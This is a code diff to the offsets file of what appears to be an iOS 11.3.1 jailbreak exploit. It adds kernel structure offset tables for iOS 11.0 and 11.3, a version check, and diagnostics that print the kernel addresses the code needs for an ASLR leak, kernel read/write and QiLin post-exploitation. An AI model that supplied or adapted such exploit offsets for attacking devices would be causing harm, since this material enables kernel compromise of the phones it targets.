@@ -12,7 +12,98 @@
 #include <string.h>
 #include <sys/utsname.h>
 #include <sys/sysctl.h>
+#include <Foundation/Foundation.h>
 #include "offsets.h"
+
+int* ian_offsets = NULL;
+
+int kstruct_offsets_11_0[] = {
+    0xb,   // KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
+    0x10,  // KSTRUCT_OFFSET_TASK_REF_COUNT,
+    0x14,  // KSTRUCT_OFFSET_TASK_ACTIVE,
+    0x20,  // KSTRUCT_OFFSET_TASK_VM_MAP,
+    0x28,  // KSTRUCT_OFFSET_TASK_NEXT,
+    0x30,  // KSTRUCT_OFFSET_TASK_PREV,
+    0x308, // KSTRUCT_OFFSET_TASK_ITK_SPACE
+    0x368, // KSTRUCT_OFFSET_TASK_BSD_INFO,
+    
+    0x0,   // KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
+    0x4,   // KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
+    0x40,  // KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
+    0x50,  // KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
+    0x60,  // KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
+    0x68,  // KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
+    0x88,  // KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG,
+    0x90,  // KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
+    0xa0,  // KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
+    
+    0x10,  // KSTRUCT_OFFSET_PROC_PID,
+    0x108, // KSTRUCT_OFFSET_PROC_P_FD
+    
+    0x0,   // KSTRUCT_OFFSET_FILEDESC_FD_OFILES
+    
+    0x8,   // KSTRUCT_OFFSET_FILEPROC_F_FGLOB
+    
+    0x38,  // KSTRUCT_OFFSET_FILEGLOB_FG_DATA
+    
+    0x10,  // KSTRUCT_OFFSET_SOCKET_SO_PCB
+    
+    0x10,  // KSTRUCT_OFFSET_PIPE_BUFFER
+    
+    0x14,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE
+    0x20,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE
+    
+    0x6c,  // KFREE_ADDR_OFFSET
+};
+
+int kstruct_offsets_11_3[] = {
+    0xb,   // KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE,
+    0x10,  // KSTRUCT_OFFSET_TASK_REF_COUNT,
+    0x14,  // KSTRUCT_OFFSET_TASK_ACTIVE,
+    0x20,  // KSTRUCT_OFFSET_TASK_VM_MAP,
+    0x28,  // KSTRUCT_OFFSET_TASK_NEXT,
+    0x30,  // KSTRUCT_OFFSET_TASK_PREV,
+    0x308, // KSTRUCT_OFFSET_TASK_ITK_SPACE
+    0x368, // KSTRUCT_OFFSET_TASK_BSD_INFO,
+    
+    0x0,   // KSTRUCT_OFFSET_IPC_PORT_IO_BITS,
+    0x4,   // KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES,
+    0x40,  // KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE,
+    0x50,  // KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT,
+    0x60,  // KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER,
+    0x68,  // KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT,
+    0x88,  // KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG,
+    0x90,  // KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT,
+    0xa0,  // KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS,
+    
+    0x10,  // KSTRUCT_OFFSET_PROC_PID,
+    0x108, // KSTRUCT_OFFSET_PROC_P_FD
+    
+    0x0,   // KSTRUCT_OFFSET_FILEDESC_FD_OFILES
+    
+    0x8,   // KSTRUCT_OFFSET_FILEPROC_F_FGLOB
+    
+    0x38,  // KSTRUCT_OFFSET_FILEGLOB_FG_DATA
+    
+    0x10,  // KSTRUCT_OFFSET_SOCKET_SO_PCB
+    
+    0x10,  // KSTRUCT_OFFSET_PIPE_BUFFER
+    
+    0x14,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE
+    0x20,  // KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE
+    
+    0x7c,  // KFREE_ADDR_OFFSET
+};
+
+int koffset(enum kstruct_offset offset) {
+    if (ian_offsets == NULL) {
+        printf("need to call offsets_init() prior to querying offsets\n");
+        return 0;
+    }
+    return ian_offsets[offset];
+}
+
+
 int hasOffsets = 0;
 ExploitOffsets offsets = {
 };
@@ -92,7 +183,27 @@ ExploitOffsets init_offsets_iPad53_11_3_1() {
     return offsets;
 }
 
+void ian_offsets_init() {
+    if (@available(iOS 11.4, *)) {
+        printf("this bug is patched in iOS 11.4 and above\n");
+        exit(EXIT_FAILURE);
+    } else if (@available(iOS 11.3, *)) {
+        printf("offsets selected for iOS 11.3 or above\n");
+        ian_offsets = kstruct_offsets_11_3;
+    } else if (@available(iOS 11.0, *)) {
+        printf("offsets selected for iOS 11.0 to 11.2.6\n");
+        ian_offsets = kstruct_offsets_11_0;
+    } else {
+        printf("iOS version too low, 11.0 required\n");
+        exit(EXIT_FAILURE);
+    }
+}
+
+
 void init_offsets() {
+    
+    ian_offsets_init();
+    
     size_t size = 32;
     char build_id[size];
     memset(build_id, 0, size);
@@ -116,6 +227,7 @@ void init_offsets() {
     
     if (strcmp(build_id, "15E302") == 0) {
         
+        /*
         //iPhone 6 Global
         if(strcmp(u.machine, "iPhone7,1") == 0) {
             
@@ -123,11 +235,11 @@ void init_offsets() {
         
         //iPhone 6 CDMA
         else if(strcmp(u.machine, "iPhone7,2") == 0) {
-            
-        }
-        
+         
+        } else
+        */
         //iPhone 6S Global
-        else if(strcmp(u.machine, "iPhone8,1") == 0) {
+        if(strcmp(u.machine, "iPhone8,1") == 0) {
              offsets = init_offsets_iPhone81_11_3_1();
         }
         
@@ -135,14 +247,45 @@ void init_offsets() {
             offsets = init_offsets_iPhone84_11_3_1();
             
         } else {
-            
+            printf("Your device isn't supported yet, find your offsets and add them to offsets.m in the project.\n");
+            return;
         }
     } else {
-        printf("unknown kernel build. If this is iOS 11 it might still be able to get tfp0, trying anyway\n");
+        printf("Currently this only supports iOS 11.3.1.\n");
         hasOffsets = 0;
         return;
     }
     
+    printf("Your offsets are: \n\n");
+    printf("- AGXCommandQueue vtable: %#llx\n", offsets.AGXCommandQueue_vtable);
+    printf("- copyin: %#llx\n", offsets.copyin);
+    printf("- copyout: %#llx\n", offsets.copyout);
+    printf("- OSSerializer_Serialize: %#llx\n", offsets.osserializer_serialize);
+    printf("- OSMetaClass: %#llx\n", offsets.metaclass);
+    printf("- kernproc: %#llx\n", offsets.kernproc);
+    printf("- kernel_map: %#llx\n", offsets.kernel_map);
+    printf(" \n");
+    if(offsets.kernel_map == 0) {
+        printf("We wont be able to leak aslr because an invalid offset for kernel_map.\n");
+    }
+    if(offsets.AGXCommandQueue_vtable == 0) {
+        printf("We wont be able to leak aslr because an invalid offset for AGXCommandQueue_vtable.\n");
+    }
+    if(offsets.copyin == 0) {
+        printf("We wont be able to gain kernel r/w because an invalid offset for copyin.\n");
+    }
+    if(offsets.copyout == 0) {
+        printf("We wont be able to gain kernel r/w because an invalid offset for copyout.\n");
+    }
+    if(offsets.osserializer_serialize == 0) {
+        printf("We wont be able to gain kernel r/w because an invalid offset for OSSerializer::Serialize().\n");
+    }
+    if(offsets.metaclass == 0) {
+        printf("We wont be able to gain kernel r/w because an invalid offset for OSMetaClass.\n");
+    }
+    if(offsets.kernproc == 0) {
+        printf("We wont be able to do post-exploitation with QiLin because an invalid offset for kernproc.\n");
+    }
 }
 
 
